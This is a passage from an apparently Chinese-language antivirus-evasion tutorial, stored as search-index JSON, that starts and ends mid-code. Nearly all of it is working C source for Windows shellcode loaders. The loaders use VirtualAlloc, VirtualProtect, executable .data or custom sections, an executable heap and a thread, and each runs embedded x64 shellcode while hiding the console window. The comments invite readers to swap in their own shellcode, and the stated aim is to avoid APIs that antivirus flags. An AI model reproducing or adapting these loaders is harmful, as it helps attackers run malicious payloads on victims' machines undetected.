=\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nvoid main()\n{\n LPVOID addr = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE,\nPAGE_EXECUTE_READWRITE);\n if (addr == NULL) {\n  return;\n }\n memcpy(addr, sc, sizeof(sc));\n ((void(*)())addr)(); // addr\u5f3a\u8f6c\u6210\u51fd\u6570\u6307\u9488 , \u52a0() , \u8c03\u7528\u51fd\u6570 , \u8fd0\u884c\u8fd9\u5757\u5185\u5b58\u4e2d\u7684shellcode\u4ee3\u7801\n}\n</code></pre> <p><code>(void(*)())</code>\u662f\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u7c7b\u578b\u7684\u5f3a\u5236\u8f6c\u6362, \u8be5\u51fd\u6570\u6307\u9488\u6307\u5411\u4e00\u4e2a\u6ca1\u6709\u53c2\u6570\u4e14\u8fd4\u56de\u503c\u7c7b\u578b\u4e3avoid\u7684\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd9\u884c\u4ee3\u7801\u5c06 addr \u7684\u5730\u5740\u8f6c\u6362\u4e3a\u4e00\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u7136\u540e\u8c03\u7528\u8be5\u6307\u9488\u6240\u6307\u5411\u7684\u51fd\u6570\u3002</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#22","title":"2.2\u4fee\u6539\u5185\u5b58\u5c5e\u6027","text":""},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#_2","title":"\u4f18\u5316\u7248\u672c","text":"<p>\u9996\u5148\u5206\u6790 , VirtualAlloc() \u8fd9\u884c\u4ee3\u7801\u6709\u5fc5\u8981\u6709\u5417 , \u5b9e\u9645\u4e5f\u6ca1\u6709\u5fc5\u8981 , \u56e0\u4e3ashellcode\u672c\u8eab , \u90a3\u5c31\u662f\u90a3\u4e2a\u5b57\u7b26\u4e32\u5b83\u5c31\u4f1a\u5728\u5185\u5b58\u7a7a\u95f4\u91cc\u9762\u5b58\u7740 , \u4f60\u4e0d\u9700\u8981\u5355\u72ec\u5728\u7a0b\u5e8f\u4e2d\u53c8\u4f7f\u7528\u4ee3\u7801\u5206\u914d\u5185\u5b58 , \u53bb\u4fdd\u5b58\u5b83</p> <p>\u90a3\u6211\u4eec\u628a\u4e0d\u5fc5\u8981\u7684\u4ee3\u7801\u90fd\u5220\u4e86</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] =\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\"; // \u6b64\u5904\u653e\u4f60\u7684shellcode\nvoid main() {\n ((void(*)())sc)();\n}\n</code></pre> <p></p> <p>\u90a3shellcode\u80fd\u6267\u884c\u5417 , \u4e0d\u80fd , \u4e3a\u4ec0\u4e48 , \u56e0\u4e3a\u5185\u5b58\u672c\u8eab\u662f\u6709\u5c5e\u6027\u7684 , \u9ed8\u8ba4\u4fdd\u5b58\u6570\u636e\u7684\u5185\u5b58\u662f\u4e0d\u53ef\u6267\u884c\u7684 , \u53ea\u6709\u8bfb\u53d6\u5199\u5c5e\u6027 , \u5982\u679c\u6709\u529e\u6cd5\u66f4\u6539\u8fd9\u5757\u5185\u5b58\u7684\u5c5e\u6027\u4e3a\u53ef\u6267\u884c\u7684 , \u90a3\u4e48shellcode\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u6b63\u5e38\u7684\u6267\u884c\u4e86</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] =\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\"; // \u6b64\u5904\u653e\u4f60\u7684shellcode\n\n\nint main() {\n    DWORD oldProtect = 0;\n    // \u4fee\u6539\u6570\u636e\u5185\u5b58\u5c5e\u6027\u4e3a\u53ef\u6267\u884c\n    VirtualProtect(sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n    // \u628a\u8fd9\u4e2a\u5185\u5b58\u7684\u6570\u636e\u8f6c\u6210\u6307\u9488\u51fd\u6570, \u51fd\u6570()\u8c03\u7528 , \u6267\u884cshellcode\u4ee3\u7801 , \u4e0d\u80fd\u6267\u884c\u5c31\u5f88\u5947\u602a\n    ((void(*)())&amp;sc)();\n}\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#23data","title":"2.3\u4fee\u6539data\u6bb5\u5c5e\u6027","text":"<p>\u518d\u4f18\u5316\u7248\u672c</p> <p>\u4fee\u6539\u5185\u5b58\u5c5e\u6027\u4e0d\u4f46\u53ef\u4ee5\u4f7f\u7528 VirtualProtect api\u51fd\u6570, \u8fd8\u53ef\u4ee5\u5728\u7a0b\u5e8f\u7f16\u8bd1\u7684\u65f6\u5019\u4fee\u6539\u5185\u5b58\u6bb5\u7684\u5c5e\u6027 , \u8fd9\u6837\u53ef\u4ee5\u89c4\u907f\u4f7f\u7528VirtualProtect\u8fd9\u4e2a\u654f\u611fapi\u51fd\u6570\u64cd\u4f5c\u4e86\u3002\u9ed8\u8ba4\u5168\u5c40\u53d8\u91cf\u662f\u5b58\u653e\u5728data\u6bb5, \u4fee\u6539\u6210\u53ef\u6267\u884c\u5373\u53ef\u3002</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n#pragma comment(linker, \"/section:.data,RWE\")//\u8bbe\u7f6e data\u6bb5\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\n\nunsigned char sc[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nint main() {\n    ((void(*)()) &amp; sc)();\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#24","title":"2.4\u65b0\u589e\u6570\u636e\u6bb5","text":"<p>\u9664\u4e86\u4fee\u6539data\u6bb5\u7684\u5185\u5b58\u5c5e\u6027, \u8fd8\u53ef\u4ee5\u65b0\u589e\u4e00\u4e2a\u6bb5, \u8bbe\u7f6e\u4e3a\u53ef\u6267\u884c\u7684\u5c5e\u6027</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\n#pragma data_seg(\"vdata\")\nunsigned char sc[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n#pragma data_seg()\n#pragma comment(linker,\"/SECTION:vdata,RWE\")\nint main() {\n    ((void(*)()) &amp; sc)();\n}\n</code></pre> <p>\u8fd9\u6bb5\u4ee3\u7801\u662f\u7528\u4e8e\u5728 Windows \u5e73\u53f0\u4e0a\u521b\u5efa\u4e00\u4e2a\u7279\u6b8a\u7684\u6570\u636e\u6bb5\uff08segment\uff09\u5e76\u5728\u5176\u4e2d\u5b58\u50a8\u4e00\u4e9b\u4e8c\u8fdb\u5236\u6570\u636e\u3002</p> <p>1.<code>#pragma data_seg(\"vdata\")</code> : \u8fd9\u662f\u4e00\u4e2a\u7f16\u8bd1\u5668\u6307\u4ee4\uff0c\u7528\u4e8e\u544a\u8bc9\u7f16\u8bd1\u5668\u5c06\u63a5\u4e0b\u6765\u7684\u6570\u636e\u653e\u7f6e\u5728\u540d\u4e3a  \"vdata\" \u7684\u7279\u6b8a\u6570\u636e\u6bb5\u4e2d\u3002\u8fd9\u4e2a\u6570\u636e\u6bb5\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u547d\u540d\u7684\u6bb5\uff0c\u7528\u4e8e\u5b58\u50a8\u4e00\u4e9b\u7279\u6b8a\u7684\u6570\u636e\u3002 2. <code>#pragma data_seg()</code> : \u8fd9\u4e2a\u6307\u4ee4\u544a\u8bc9\u7f16\u8bd1\u5668\u505c\u6b62\u5c06\u6570\u636e\u653e\u7f6e\u5728\u4e4b\u524d\u5b9a\u4e49\u7684\u7279\u6b8a\u6570\u636e\u6bb5\u4e2d\uff0c\u5373  \"vdata\"\u3002 3. <code>#pragma comment(linker,\"/SECTION:vdata,RWE\")</code> : \u8fd9\u662f\u4e00\u4e2a\u94fe\u63a5\u5668\u6307\u4ee4\uff0c\u544a\u8bc9\u94fe\u63a5\u5668\u5c06 \"vdata\"  \u6bb5\u6807\u8bb0\u4e3a\u53ef\u8bfb\uff08Read\uff09\u3001\u53ef\u5199\uff08Write\uff09\u3001\u53ef\u6267\u884c\uff08Execute\uff09\u3002\u8fd9\u662f\u4e3a\u4e86\u786e\u4fdd\u5728\u8fd0\u884c\u65f6\u53ef\u4ee5\u4fee\u6539 \u8fd9\u4e2a\u6bb5\u7684\u5185\u5bb9\uff0c\u901a\u5e38\u7528\u4e8e\u5b9e\u73b0\u4e00\u4e9b\u52a8\u6001\u4ee3\u7801\u751f\u6210\u6216\u8005\u4ee3\u7801\u6ce8\u5165\u7684\u6280\u672f</p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#25","title":"2.5\u901a\u8fc7\u5806\u52a0\u8f7d","text":"<p>\u9664\u4e86\u901a\u8fc7\u94fe\u63a5\u5668\u4fee\u6539\u6570\u636e\u6bb5\u7684\u5185\u5b58\u5c5e\u6027\u5916\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7HeapCreate api\u83b7\u53d6\u4e00\u4e2a\u5177\u6709\u6267\u884c\u6743\u9650\u7684\u5806\uff0c\u5e76\u5728\u5176\u4e2d\u5206\u914d\u4e00\u5757\u5185\u5b58\u5c06\u5176\u5730\u5740\u8d4b\u7ed9shellcode\uff0c\u4e5f\u662f\u4e00\u79cd\u89c4\u907fVirtualAlloc\uff0cVirtualProtect api\u7684\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\uff0c\u901a\u8fc7\u6307\u9488\u8fd0\u884c</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n\nunsigned char sc[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n\nvoid main() {\n    //\u4e4b\u540e\u521b\u5efa\u4e00\u4e2a\u5177\u6709\u6267\u884c\u6743\u9650\u7684\u5806\uff0c\u7528\u4e8e\u5b58\u50a8shellcode\n    HANDLE HeapHandle= HeapCreate(HEAP_CREATE_ENABLE_EXECUTE,sizeof(sc),0);\n    //\u5728\u521b\u5efa\u7684\u5806\u4e2d\u5206\u914d\u4e00\u5757\u5185\u5b58\uff0c\u5e76\u5c06\u5176\u5730\u5740\u8d4b\u7ed9buffer\n    char* buffer = (char*)HeapAlloc(HeapHandle,HEAP_ZERO_MEMORY,sizeof(sc));\n    //\u5c06shellcode\u590d\u5236\u5230buffer\u6307\u5b9a\u7684\u5185\u5b58\u4e2d\n    memcpy(buffer,sc,sizeof(sc));\n    //\u5c06buffer\u6307\u5411\u7684\u5185\u5b58\u5730\u5740\u5f3a\u5236\u8f6c\u6362\u6210\u4e3a\u4e00\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u5e76\u8c03\u7528\u8be5\u51fd\u6570\uff0c\u6267\u884cshellcode\n    ((void(*)()) buffer)();\n}\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#3","title":"3.\u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c","text":"<p>\u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] =  \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x8